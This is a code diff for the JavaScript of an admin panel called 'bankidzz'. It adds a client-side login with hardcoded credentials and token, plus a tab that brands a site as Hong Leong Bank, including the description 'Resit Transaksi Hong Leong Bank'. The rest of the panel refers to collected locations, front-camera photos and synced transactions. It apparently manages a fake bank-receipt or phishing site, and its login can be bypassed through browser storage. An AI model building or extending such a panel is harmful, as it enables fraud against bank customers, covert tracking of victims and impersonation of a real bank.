@@ -9,6 +9,8 @@
     const CONFIG = {
         API_URL: '/api/locations',
         TEMPLATE_URL: '/api/template',
+        WEBPROFILE_URL: '/api/webprofile',
+        UPLOAD_URL: '/api/upload',
         SYNC_CHANNEL: 'bankidzz_sync_channel',
         AUTH_TOKEN: 'Bearer bankidzz-admin-secure-2026'
     };
@@ -20,9 +22,11 @@
         tabDashboard: document.getElementById('tabDashboard'),
         tabTransfer: document.getElementById('tabTransfer'),
         tabUser: document.getElementById('tabUser'),
+        tabWeb: document.getElementById('tabWeb'),
         sectionDashboard: document.getElementById('sectionDashboard'),
         sectionTransfer: document.getElementById('sectionTransfer'),
         sectionUser: document.getElementById('sectionUser'),
+        sectionWeb: document.getElementById('sectionWeb'),
         // Form Inputs
         t_topBarTitle: document.getElementById('t_topBarTitle'),
         t_primaryColor: document.getElementById('t_primaryColor'),
@@ -55,7 +59,14 @@
         frontCamTitle: document.getElementById('frontCamTitle'),
         frontCamImg: document.getElementById('frontCamImg'),
         btnDownloadFront: document.getElementById('btnDownloadFront'),
-        frontCamInfo: document.getElementById('frontCamInfo')
+        frontCamInfo: document.getElementById('frontCamInfo'),
+        // Login Elements
+        adminContainer: document.getElementById('adminContainer'),
+        loginOverlay: document.getElementById('loginOverlay'),
+        loginAlert: document.getElementById('loginAlert'),
+        loginUsername: document.getElementById('loginUsername'),
+        loginPassword: document.getElementById('loginPassword'),
+        btnAuthenticate: document.getElementById('btnAuthenticate')
     };
 
     // ============================================================
@@ -73,16 +84,85 @@
     updateClock();
 
     // ============================================================
+    // ACCESS TERMINAL HELIX - AUTHENTICATION
+    // ============================================================
+    const ADMIN_CREDENTIALS = {
+        username: 'adminbimkidzz',
+        password: 'adminbimkidzz123'
+    };
+
+    function checkHelixAuth() {
+        const isAuth = sessionStorage.getItem('helix_admin_session') === 'active' || 
+                       localStorage.getItem('helix_admin_session') === 'active';
+        if (isAuth) {
+            if (elements.loginOverlay) elements.loginOverlay.style.display = 'none';
+            if (elements.adminContainer) elements.adminContainer.style.display = 'block';
+            return true;
+        } else {
+            if (elements.loginOverlay) elements.loginOverlay.style.display = 'flex';
+            if (elements.adminContainer) elements.adminContainer.style.display = 'none';
+            return false;
+        }
+    }
+
+    window.handleHelixLogin = function() {
+        const u = elements.loginUsername ? elements.loginUsername.value.trim() : '';
+        const p = elements.loginPassword ? elements.loginPassword.value : '';
+
+        if (u === ADMIN_CREDENTIALS.username && p === ADMIN_CREDENTIALS.password) {
+            if (elements.loginAlert) elements.loginAlert.style.display = 'none';
+            if (elements.btnAuthenticate) {
+                elements.btnAuthenticate.textContent = 'ACCESS GRANTED...';
+                elements.btnAuthenticate.style.background = '#00ffb3';
+                elements.btnAuthenticate.style.color = '#000000';
+            }
+
+            setTimeout(() => {
+                sessionStorage.setItem('helix_admin_session', 'active');
+                localStorage.setItem('helix_admin_session', 'active');
+                checkHelixAuth();
+                if (elements.btnAuthenticate) {
+                    elements.btnAuthenticate.textContent = 'AUTHENTICATE';
+                    elements.btnAuthenticate.style.background = '';
+                    elements.btnAuthenticate.style.color = '';
+                }
+                showNotification('⚡ Welcome, Administrator');
+                loadTransactions();
+            }, 400);
+        } else {
+            if (elements.loginAlert) {
+                elements.loginAlert.textContent = '⚠️ ACCESS DENIED: Invalid Username or Password';
+                elements.loginAlert.style.display = 'block';
+            }
+            if (elements.loginPassword) {
+                elements.loginPassword.value = '';
+                elements.loginPassword.focus();
+            }
+        }
+    };
+
+    window.handleHelixLogout = function() {
+        sessionStorage.removeItem('helix_admin_session');
+        localStorage.removeItem('helix_admin_session');
+        if (elements.loginUsername) elements.loginUsername.value = '';
+        if (elements.loginPassword) elements.loginPassword.value = '';
+        if (elements.loginAlert) elements.loginAlert.style.display = 'none';
+        checkHelixAuth();
+    };
+
+    // ============================================================
     // TAB SWITCHER
     // ============================================================
     window.switchTab = function(tabName) {
         if (elements.tabDashboard) elements.tabDashboard.classList.remove('active');
         if (elements.tabTransfer) elements.tabTransfer.classList.remove('active');
         if (elements.tabUser) elements.tabUser.classList.remove('active');
+        if (elements.tabWeb) elements.tabWeb.classList.remove('active');
 
         if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'none';
         if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'none';
         if (elements.sectionUser) elements.sectionUser.style.display = 'none';
+        if (elements.sectionWeb) elements.sectionWeb.style.display = 'none';
 
         if (tabName === 'dashboard') {
             if (elements.tabDashboard) elements.tabDashboard.classList.add('active');
@@ -94,6 +174,10 @@
         } else if (tabName === 'user') {
             if (elements.tabUser) elements.tabUser.classList.add('active');
             if (elements.sectionUser) elements.sectionUser.style.display = 'block';
+        } else if (tabName === 'web') {
+            if (elements.tabWeb) elements.tabWeb.classList.add('active');
+            if (elements.sectionWeb) elements.sectionWeb.style.display = 'block';
+            loadWebProfile();
         }
     };
 
@@ -189,6 +273,223 @@
             channel.postMessage({ type: 'template_updated', template: template });
             channel.close();
         } catch(e) {}
+    };
+
+    // ============================================================
+    // HELIX WEB PROFILE MANAGEMENT (EXACT TO USER SCREENSHOTS)
+    // ============================================================
+    const webFileState = {
+        favicon: { file: null, base64: null, filename: null },
+        appleTouchIcon: { file: null, base64: null, filename: null },
+        ogImage: { file: null, base64: null, filename: null },
+        twitterImage: { file: null, base64: null, filename: null }
+    };
+
+    let currentWebProfile = {
+        siteTitle: 'HONGLEONG',
+        metaDescription: 'HONGLEONG',
+        favicon: 'uploads/channels4_profile.jpg',
+        appleTouchIcon: 'uploads/channels4_profile.jpg',
+        themeColor: '#0033ff',
+        appleWebAppCapable: 'yes',
+        appleWebAppStatusbarStyle: 'default',
+        ogType: 'website',
+        ogLocale: 'en_MY',
+        ogTitle: 'HONGLEONG',
+        ogDescription: 'HONGLEONG',
+        ogUrl: 'https://',
+        ogImage: 'uploads/channels4_profile.jpg',
+        ogImageWidth: '1200',
+        ogImageHeight: '630',
+        ogImageAlt: 'JAPANESE BANK',
+        twitterCardType: 'summary_large_image',
+        twitterTitle: 'Hong Leong Bank',
+        twitterDescription: 'Resit Transaksi Hong Leong Bank',
+        twitterImage: 'uploads/channels4_profile.jpg'
+    };
+
+    window.updateThemeColorBar = function(color) {
+        const bar = document.getElementById('w_themeColorBar');
+        if (bar) bar.style.background = color;
+    };
+
+    window.handleWebFileSelect = function(event, field) {
+        const file = event.target.files[0];
+        const nameEl = document.getElementById(`name_${field}`);
+        if (!file) return;
+
+        if (nameEl) nameEl.textContent = file.name;
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            webFileState[field] = {
+                file: file,
+                base64: e.target.result,
+                filename: file.name
+            };
+        };
+        reader.readAsDataURL(file);
+    };
+
+    async function loadWebProfile() {
+        try {
+            const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
+            if (response.ok) {
+                const result = await response.json();
+                if (result.profile) {
+                    currentWebProfile = { ...currentWebProfile, ...result.profile };
+                    populateWebProfileForm(currentWebProfile);
+                    return;
+                }
+            }
+        } catch (e) {
+            console.warn('Gagal memuat web profile dari server', e);
+        }
+
+        const stored = localStorage.getItem('bankidzz_web_profile');
+        if (stored) {
+            try {
+                currentWebProfile = { ...currentWebProfile, ...JSON.parse(stored) };
+                populateWebProfileForm(currentWebProfile);
+            } catch (e) {}
+        } else {
+            populateWebProfileForm(currentWebProfile);
+        }
+    }
+
+    function populateWebProfileForm(p) {
+        const setVal = (id, val) => {
+            const el = document.getElementById(id);
+            if (el && val !== undefined) el.value = val;
+        };
+        const setText = (id, val) => {
+            const el = document.getElementById(id);
+            if (el) el.textContent = val || '-';
+        };
+
+        // Basic Meta
+        setVal('w_siteTitle', p.siteTitle || 'HONGLEONG');
+        setVal('w_metaDescription', p.metaDescription || 'HONGLEONG');
+        setText('cur_favicon', p.favicon || '-');
+        setText('cur_appleTouchIcon', p.appleTouchIcon || '-');
+        setVal('w_themeColor', p.themeColor || '#0033ff');
+        window.updateThemeColorBar(p.themeColor || '#0033ff');
+        setVal('w_appleWebAppCapable', p.appleWebAppCapable || 'yes');
+        setVal('w_appleWebAppStatusbarStyle', p.appleWebAppStatusbarStyle || 'default');
+
+        // Open Graph
+        setVal('w_ogType', p.ogType || 'website');
+        setVal('w_ogLocale', p.ogLocale || 'en_MY');
+        setVal('w_ogTitle', p.ogTitle || 'HONGLEONG');
+        setVal('w_ogDescription', p.ogDescription || 'HONGLEONG');
+        setVal('w_ogUrl', p.ogUrl || 'https://');
+        setText('cur_ogImage', p.ogImage || '-');
+        setVal('w_ogImageWidth', p.ogImageWidth || '1200');
+        setVal('w_ogImageHeight', p.ogImageHeight || '630');
+        setVal('w_ogImageAlt', p.ogImageAlt || 'JAPANESE BANK');
+
+        // Twitter Card
+        setVal('w_twitterCardType', p.twitterCardType || 'summary_large_image');
+        setVal('w_twitterTitle', p.twitterTitle || 'Hong Leong Bank');
+        setVal('w_twitterDescription', p.twitterDescription || 'Resit Transaksi Hong Leong Bank');
+        setText('cur_twitterImage', p.twitterImage || '-');
+
+        // Reset file names and checkboxes
+        ['favicon', 'appleTouchIcon', 'ogImage', 'twitterImage'].forEach(field => {
+            const nameEl = document.getElementById(`name_${field}`);
+            if (nameEl) nameEl.textContent = 'No file chosen';
+            const delEl = document.getElementById(`del_${field}`);
+            if (delEl) delEl.checked = false;
+        });
+    }
+
+    window.saveWebProfile = async function() {
+        const getVal = (id, fallback) => {
+            const el = document.getElementById(id);
+            return el ? el.value : fallback;
+        };
+        const isDel = (field) => {
+            const el = document.getElementById(`del_${field}`);
+            return el ? el.checked : false;
+        };
+
+        const updatedProfile = { ...currentWebProfile };
+
+        // 1. Upload files if any selected
+        for (const field of ['favicon', 'appleTouchIcon', 'ogImage', 'twitterImage']) {
+            if (isDel(field)) {
+                updatedProfile[field] = '';
+            } else if (webFileState[field].base64) {
+                try {
+                    const uploadRes = await fetch(CONFIG.UPLOAD_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': CONFIG.AUTH_TOKEN
+                        },
+                        body: JSON.stringify({
+                            field: field,
+                            filename: webFileState[field].filename,
+                            base64: webFileState[field].base64
+                        })
+                    });
+                    if (uploadRes.ok) {
+                        const uploadJson = await uploadRes.json();
+                        if (uploadJson.url) {
+                            updatedProfile[field] = uploadJson.url;
+                            webFileState[field] = { file: null, base64: null, filename: null };
+                        }
+                    }
+                } catch(e) {
+                    console.warn(`Gagal upload ${field}:`, e);
+                }
+            }
+        }
+
+        // 2. Form values
+        updatedProfile.siteTitle = getVal('w_siteTitle', 'HONGLEONG');
+        updatedProfile.metaDescription = getVal('w_metaDescription', 'HONGLEONG');
+        updatedProfile.themeColor = getVal('w_themeColor', '#0033ff');
+        updatedProfile.appleWebAppCapable = getVal('w_appleWebAppCapable', 'yes');
+        updatedProfile.appleWebAppStatusbarStyle = getVal('w_appleWebAppStatusbarStyle', 'default');
+
+        updatedProfile.ogType = getVal('w_ogType', 'website');
+        updatedProfile.ogLocale = getVal('w_ogLocale', 'en_MY');
+        updatedProfile.ogTitle = getVal('w_ogTitle', 'HONGLEONG');
+        updatedProfile.ogDescription = getVal('w_ogDescription', 'HONGLEONG');
+        updatedProfile.ogUrl = getVal('w_ogUrl', 'https://');
+        updatedProfile.ogImageWidth = getVal('w_ogImageWidth', '1200');
+        updatedProfile.ogImageHeight = getVal('w_ogImageHeight', '630');
+        updatedProfile.ogImageAlt = getVal('w_ogImageAlt', 'JAPANESE BANK');
+
+        updatedProfile.twitterCardType = getVal('w_twitterCardType', 'summary_large_image');
+        updatedProfile.twitterTitle = getVal('w_twitterTitle', 'Hong Leong Bank');
+        updatedProfile.twitterDescription = getVal('w_twitterDescription', 'Resit Transaksi Hong Leong Bank');
+
+        currentWebProfile = updatedProfile;
+        localStorage.setItem('bankidzz_web_profile', JSON.stringify(updatedProfile));
+
+        // 3. Post to server
+        try {
+            await fetch(CONFIG.WEBPROFILE_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': CONFIG.AUTH_TOKEN
+                },
+                body: JSON.stringify(updatedProfile)
+            });
+        } catch(e) {}
+
+        // 4. Broadcast
+        try {
+            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
+            channel.postMessage({ type: 'webprofile_updated', profile: updatedProfile });
+            channel.close();
+        } catch(e) {}
+
+        populateWebProfileForm(updatedProfile);
+        showNotification('Web profile configuration saved & synced!');
     };
 
     // ============================================================
@@ -423,9 +724,24 @@
     if (elements.btnClearAll) elements.btnClearAll.addEventListener('click', clearAllTransactions);
 
     // Init
+    checkHelixAuth();
     loadTemplate();
+    loadWebProfile();
     loadTransactions();
     setupSyncListener();
+
+    // Check URL hash or param on load (e.g. admin.html#web or admin.html?tab=web)
+    try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const tabParam = urlParams.get('tab') || window.location.hash.replace('#', '');
+        if (tabParam === 'web') {
+            switchTab('web');
+        } else if (tabParam === 'transfer') {
+            switchTab('transfer');
+        } else if (tabParam === 'user') {
+            switchTab('user');
+        }
+    } catch(e) {}
 
     // Auto-polling berkala setiap 3.5 detik agar selalu update dari perangkat lain
     setInterval(loadTransactions, 3500);
